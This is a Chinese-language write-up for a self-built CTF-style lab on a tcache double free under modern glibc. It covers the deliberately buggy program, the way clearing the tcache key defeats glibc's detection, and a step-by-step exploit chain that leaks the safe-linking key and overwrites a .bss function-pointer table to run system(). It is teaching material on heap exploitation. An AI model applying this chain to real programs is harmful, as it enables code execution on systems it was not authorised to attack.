# lab_double_free —— 自造 double free 靶场（L7）

> **这是自造实验，不是真实赛题。** 目的：在**现代 glibc（2.29+ 有 tcache key 检测、
> 2.32+ 有 safe-linking）**上把 double free 完整跑一遍：
> `free` 前 memset 把 `tcache_entry.key` 抹掉 → 同一 chunk 连 free 两次 → tcache 成环
> → 三次 malloc 拿到同一块两次 → 改写 `next` → `malloc` 落到 `.bss` 函数指针表。

---

## 1. 题目行为

```text
1. add      index / size / data   malloc(size) 存进 slots[index]，data 按 size 定长读入
2. show     index                 write(1, slots[index], sizes[index])   ← free 之后照样能读
3. del      index                 secure_free(slots[index], sizes[index])，**不清空 slots[]**
4. trigger  index                 handlers[index]("triggered")            ← .bss 函数指针表
5. exit
```

两个 bug（本 lab 的全部）：

```c
static void secure_free(void *p, size_t n) {
    if (!p) return;
    memset(p, 0, n);      /* bug 1：“安全清零”顺手把 tcache_entry.key 清掉了 */
    free(p);
}
/* bug 2：del 之后不清空 slots[i] / sizes[i] → 可重复 del、可 show 已释放 chunk */
```

保护（`checksec`，本机 gcc 15 + `-fno-pie -no-pie`）：

| 项 | 值 |
| --- | --- |
| 架构 | amd64，动态链接，glibc **2.43** |
| PIE | 无（基址 `0x400000`） |
| canary | 有（`-fstack-protector-strong`） |
| NX | 开启 |
| RELRO | Partial |

关键符号（随编译器版本会变，`exp.py` 一律用 `ELF().symbols` 取）：

```text
handlers   0x4041a0    void (*handlers[8])(const char *)，__attribute__((aligned(16)))
win        0x4012df    system("cat flag.txt")
```

## 2. 为什么是 double free（而不是 L4 的 tcache poisoning）

| 模式 | 需要的原语 | 本 lab 的区别 |
| --- | --- | --- |
| `heap_uaf`（L6） | free 后结构体仍被引用 → `malloc` 复用旧结构体 | 不需要重复 free，靠分配顺序 |
| `tcache_poisoning`（L4） | UAF **写**队尾 chunk 的 `next` | 不需要重复 free，只要一次写 |
| **`double_free`（本 lab）** | 同一 chunk 进 bin **两次** | 需要先绕过 2.29+ 的 `key` 检测 |

glibc 2.29 起 `tcache_put()` 里多了一段检测：

```c
if (__glibc_unlikely (e->key == tcache)) {
    /* 遍历该 bin，若发现 e 已在里面 */
    malloc_printerr ("free(): double free detected in tcache 2");
}
```

实测（把 `memset` 去掉后重编译，其余不动）：

```text
free(): double free detected in tcache 2
```

所以**朴素**的 `free(0); free(1); free(0)` 在 2.43 上直接 abort。本 lab 的绕过点是
`secure_free()` 在 `free` 之前 `memset(p, 0, n)` —— `next` 和 `key` 一起变 0，
检测依据消失，三次 free 全部通过。现实里对应“释放前 memset / 把指针字段清零”的写法
（本意是防信息泄漏，反而制造 double free）。

## 3. 利用链

```text
add(0, 0x40)  add(1, 0x40)          # 0x50 chunk：c0、c1
del(0)                              # tcache[0x50] = c0，c0->next = 0 ^ (c0>>12)
show(0, 8)                          # 读回 (c0>>12) → safe-linking 混淆 key = 页号
del(1)                              # tcache = c1 -> c0
del(0)                              # memset 清 key → 通过检测；tcache = c0 -> c1 -> c0（环）
add(2, p64(handlers ^ page))        # 取 c0；顺手写它的 next（环里 c0 还会出现，那次就用这个值）
add(3)                              # c1
add(4)                              # c0 第二次；tcache 头被读成 handlers
add(5, p64(win))                    # malloc 返回 &handlers → handlers[0] = win
trigger(0)                          # win() → system("cat flag.txt")
```

关键的一步是 `add(2)`：它取走的是环里的**第一个** c0，而此时 c0 仍通过 `c1->next`
挂在链上；第三次 `add` 取 c0 时读的正是我们在 `add(2)` 里写下的 `next`。
所以“改写 next 的时机 = 第一次取出该 chunk 时”，这是 double free 特有的一步。

## 4. 坑点（本次实测踩到的）

1. **不 memset 就一定 abort**：`free(): double free detected in tcache 2`，
   进程 `SIGABRT`（exit code -6）。这是本 lab 要演示的“现代 glibc 拦住了朴素 double free”。
2. **目标必须 16 字节对齐**：`tcache_get()` 有 `aligned_OK(e)` 检查。`handlers[]` 用
   `__attribute__((aligned(16)))` 保证（实测 `0x4041a0`）。不对齐 → `malloc(): unaligned tcache chunk detected`。
3. **目标后面 8 字节必须可写**：`tcache_get()` 会回写 `e->key = 0`（即 `&handlers + 8`）。
   `handlers[8]` 是 64 字节，够用；如果目标是只读页或结构末尾，会直接段错误。
4. **泄漏只能从“bin 里只有它一个”的 chunk 拿**：此时 `next = 0 ^ (c0>>12)`，读出来就是
   页号本身；一旦 bin 里有两个以上，读到的就是 `c1 ^ (c0>>12)`，需要再解一个未知数。
5. **`show` 用的是 `sizes[]`，del 不能清 `sizes[]`**：清了就不知道自己该读多少字节。
6. **计数器会被打成 `SIZE_MAX`**：第 4 次 `malloc` 从 `handlers` 取（此时 count 已经 0），
   `--count` 变成 `-1`。之后本 lab 不再 `malloc`/`free`，所以无害；真实链里如果还要继续分配，
   要记住这个状态会让 `tcache_put` 全部走 `_int_free`。

## 5. 复现

```bash
cd '/home/yfhd5/Pwn_Writeups/labs/lab_double_free'
source ../../.venv/bin/activate
make
printf '__PWNED__{dfree_ok}\n' > flag.txt
python exp.py                          # 期望输出 __PWNED__{dfree_ok}
# 远程：socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./chal 后
#       HOST=127.0.0.1 PORT=9999 python exp.py
```

实测输出（本机 glibc 2.43）：

```text
[+] safe-linking page key = 0x3e5a0
[+] double free (tcache) OK
__PWNED__{dfree_ok}
```

文件：`chal`（`make` 产物）+ `exp.py` + `src/chal.c` + `Makefile`。

## 6. 识别卡

```text
free 之前有 memset / 字段清零，且 del 之后指针不清空（能重复 del）
  -> double free：先确认 tcache key 检测是否被写入逻辑打掉
现代 glibc 上按顺序问三件事：
  1) key 能不能被清掉？能 -> tcache 层直接 double free（本 lab）
  2) 清不掉 -> 填满 7 个 tcache 项，把 free 逼到 fastbin（fastbin 只比对 bin 头，a->b->a 仍成立）
  3) 还需要 heap 页号（safe-linking）-> 让 bin 里只剩一个 chunk，读它的 next
```

> 与真实题的关系：赛题里 double free 几乎总是和“释放前清理”“重复 delete”一起出现
> （如 `hitcontraining_uaf` 的 delete 不置空）。本 lab 特意保留 tcache 层（不填满 7 个），
> 这样链路最短、最容易对照；fastbin dup 那条路只写在识别卡里，没有做成第二个靶子。
